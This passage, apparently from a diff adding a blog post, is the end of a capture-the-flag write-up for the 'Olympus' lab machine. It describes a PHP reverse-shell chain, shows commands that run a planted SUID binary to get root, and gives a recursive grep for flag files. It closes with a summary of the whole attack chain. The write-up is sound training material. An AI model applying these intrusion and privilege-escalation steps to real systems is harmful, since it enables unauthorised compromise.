+<p>The PHP script must first be made accessible to the web server and triggered through an HTTP request.</p>
+<p>The script accepts connection parameters through GET arguments, including an IP address and port.</p>
+<p><strong>Reverse connection</strong></p>
+<p>The script uses PHP&#39;s <code>fsockopen</code> function to establish a connection to the specified listener.</p>
+<p>It then uses <code>proc_open</code> to execute a shell command.</p>
+<p><strong>Privilege escalation</strong></p>
+<p>The important component is the executable:</p>
+<pre><code class="language-text">/lib/defended/libc.s0.99
+</code></pre>
+<p>The script invokes this binary as part of its execution chain.</p>
+<p>The binary is intended to provide a root-level shell because of its SUID configuration and ownership.</p>
+<p><strong>Impact</strong></p>
+<p>If the chain executes as intended, the resulting shell can provide root-level access to the target.</p>
+<p>This is a privilege-escalation path involving an exposed PHP script and a specially configured SUID executable.</p>
+<h2>13. Obtaining Root Access</h2>
+<p>In my case, I chose to execute the SUID binary directly rather than relying entirely on the PHP reverse-shell chain.</p>
+<p>The relevant executable is:</p>
+<pre><code class="language-text">/lib/defended/libc.s0.99
+</code></pre>
+<p>Executing it provides the privilege-escalation opportunity.</p>
+<p>The command sequence referenced by the PHP script is:</p>
+<pre><code class="language-bash">uname -a; w; /lib/defended/libc.s0.99
+</code></pre>
+<p>Alternatively, the binary can be invoked directly:</p>
+<pre><code class="language-bash">/lib/defended/libc.s0.99
+</code></pre>
+<p>then</p>
+<pre><code>bash
+</code></pre>
+<p>In my case, I performed a little additional work to obtain a more usable shell by executing the binary and then invoking Bash.</p>
+<p>After obtaining the root shell, I changed to the root directory.</p>
+<pre><code class="language-bash">cd /root
+</code></pre>
+<p>We can now retrieve the <strong>root flag</strong>.</p>
+<img width="1395" height="861" alt="Screenshot 2026-09-17 163645" src="https://github.com/user-attachments/assets/6f5ce579-c80c-445e-a4dc-afe2e76884e8" />
+
+
+<h2>14. Finding the Bonus Flag</h2>
+<p>The root flag file also provides a hint about a bonus flag.</p>
+<p>The hint references SSL, but it does not immediately identify the exact file location.</p>
+<p>Rather than guessing, I used a regular expression to search readable files for strings matching the flag format.</p>
+<pre><code class="language-bash">for d in /*/; do (find &quot;$d&quot; -type f -readable -print0 2&gt;/dev/null | xargs -0 -r grep -HaoE &#39;flag\{[^}]+\}&#39; 2&gt;/dev/null) &amp; done; wait
+</code></pre>
+<p>This command searches readable files under the top-level directories for strings matching the pattern:</p>
+<pre><code class="language-text">flag{...}
+</code></pre>
+<p>Depending on the number of files and the target&#39;s performance, the search may take some time.</p>
+<p>Be patient while it runs.</p>
+<p>[Add bonus flag search screenshot here]</p>
+<p>The search reveals the bonus flag file:</p>
+<pre><code class="language-text">/etc/ssl/private/.b0nus.fl4g
+</code></pre>
+<p>The path also matches the SSL-related hint provided by the room.</p>
+<p>We can now inspect the file and retrieve the <strong>bonus flag</strong>.</p>
+<pre><code>cat /etc/ssl/private/.b0nus.fl4g
+</code></pre>
+<h2>Conclusion</h2>
+<p>The Olympus room demonstrates how several individually useful findings can be combined into a complete compromise.</p>
+<p>The attack path involved:</p>
+<ol>
+<li>Network reconnaissance using Nmap.</li>
+<li>Virtual-host discovery and local hostname resolution.</li>
+<li>Web directory enumeration using Gobuster.</li>
+<li>SQL injection testing and database enumeration using SQLmap.</li>
+<li>Password hash cracking with John the Ripper.</li>
+<li>Credential reuse to access the administrator panel and chat application.</li>
+<li>Discovering randomized upload filenames through database enumeration.</li>
+<li>Obtaining an initial shell through the uploaded PHP file.</li>
+<li>SUID enumeration and abuse of <code>cputils</code>.</li>
+<li>SSH access as Zeus through modification of authorized keys.</li>
+<li>Discovering and exploiting a root-level SUID execution path.</li>
+<li>Retrieving the user, root, and bonus flags.</li>
+</ol>
+<p>The most important lesson from this machine is that <strong>information gathered at one stage can become the key to the next stage</strong>.</p>
+<p>The SQL injection did more than expose a database. It revealed credentials, chat records, and filenames that helped connect multiple parts of the attack chain. Likewise, the SUID binary was not just an isolated finding: its file-writing behavior enabled SSH access, while another specially configured binary provided the route to root.</p>
+<p>That is what makes chained exploitation interesting. The individual vulnerabilities matter, but understanding how they interact is what turns reconnaissance into a complete compromise.</p>
+
+    </article>
+  </main>
+
+  <footer>
+    <span class="f-accent">$</span> echo "Made by <span class="f-accent">Aryan Giri</span>" &nbsp;·&nbsp; <a href="https://github.com/giriaryan694-a11y" target="_blank" rel="noopener noreferrer">GitHub</a>
+  </footer>
+
+  <script>
+    /* Theme — synced with main site via same cookie */
+    const themes=["dark","light","eye-saver"];
+    const themeData={"dark":{emoji:"🌙",label:"Dark"},"light":{emoji:"☀️",label:"Light"},"eye-saver":{emoji:"☕",label:"Reading"}};
+    function setCookie(n,v,d){const e=new Date();e.setTime(e.getTime()+d*86400000);document.cookie=`${n}=${v};expires=${e.toUTCString()};path=/`;}
+    function getCookie(n){const m=document.cookie.match(new RegExp('(^| )'+n+'=([^;]+)'));return m?m[2]:null;}
+    let currentTheme=getCookie("site_theme")||"dark";
+    const themeBtn=document.getElementById("theme-btn");
+    const themeEmoji=document.getElementById("theme-emoji");
+    function applyTheme(theme,animate=false){
+      document.body.className=theme==="dark"?"":theme;
+      themeEmoji.textContent=themeData[theme].emoji;
+      document.getElementById("theme-label").textContent=themeData[theme].label;
+      setCookie("site_theme",theme,365);
+      if(animate){themeEmoji.style.animation="none";themeEmoji.offsetHeight;themeEmoji.style.animation="popSpin 0.4s cubic-bezier(0.175,0.885,0.32,1.275) forwards";}
+    }
+    applyTheme(currentTheme);
+    themeBtn.addEventListener("click",()=>{currentTheme=themes[(themes.indexOf(currentTheme)+1)%themes.length];applyTheme(currentTheme,true);});
+
+    /* Links → new tab + copy buttons on code blocks */
+    document.querySelectorAll(".post-content a").forEach(l => {
+      l.setAttribute("target", "_blank");
+      l.setAttribute("rel", "noopener noreferrer");
+    });
+    document.querySelectorAll("pre").forEach(pre => {
+      const code = pre.querySelector("code");
+      if (!code) return;
+      const btn = document.createElement("button");
+      btn.className = "copy-btn";
+      btn.textContent = "copy";
+      btn.onclick = async () => {
+        try { await navigator.clipboard.writeText(code.innerText.trimEnd()); }
+        catch {}
+        btn.textContent = "✓ copied"; btn.classList.add("copied");
+        setTimeout(() => { btn.textContent = "copy"; btn.classList.remove("copied"); }, 2000);
+      };
+      pre.appendChild(btn);
+    });
+  </script>
+</body>
+</html>
